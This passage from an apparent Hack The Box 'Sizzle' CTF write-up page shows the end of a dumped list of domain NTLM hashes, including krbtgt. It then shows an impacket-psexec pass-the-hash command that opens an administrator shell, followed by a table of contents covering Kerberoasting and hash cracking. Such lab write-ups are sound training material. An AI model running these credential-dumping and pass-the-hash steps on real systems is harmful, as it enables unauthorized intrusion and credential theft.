+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+</span></span><span style="display:flex;"><span>mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+</span></span><span style="display:flex;"><span>sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+</span></span><span style="display:flex;"><span>SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:e998d6b01fc22017e88b4e3dd59ed5c3:::
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-psexec htb.local/administrator@10.129.124.103 -hashes :f6b7160bfc91823792e0ac3a162c9267                   
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.129.124.103.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file iTiinPYg.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.129.124.103.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service rUhT on 10.129.124.103.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service rUhT.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.14393<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2016</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;
+</span></span></code></pre></div>
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="https://pL4sTiC1337.github.io/writeups/htb-vault/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>HtB Vault</a>
+        
+	    
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a>
+      <ul>
+        <li><a href="#nmap">nmap</a></li>
+        <li><a href="#http---80tcp">HTTP - 80/tcp</a></li>
+        <li><a href="#smb---443tcp">SMB - 443/tcp</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-access">Initial Access</a>
+      <ul>
+        <li><a href="#smb-write-access">SMB Write Access</a></li>
+        <li><a href="#ntlmv2-hash-crack">NTLMv2 Hash Crack</a></li>
+      </ul>
+    </li>
+    <li><a href="#amandas-credentials">Amanda&rsquo;s Credentials</a>
+      <ul>
+        <li><a href="#bloodhound">Bloodhound</a></li>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#certificate-server">Certificate Server</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-amanda">Shell as Amanda</a>
+      <ul>
+        <li><a href="#check-spn-accounts">Check SPN Accounts</a></li>
+        <li><a href="#kerberoast-mrlky">Kerberoast: mrlky</a></li>
+        <li><a href="#hash-crack">Hash Crack</a></li>
+        <li><a href="#impersonate-mrlky">Impersonate mrlky</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-mrlky">Shell as mrlky</a></li>
+    <li><a href="#shell-as-administrator">Shell as Administrator</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
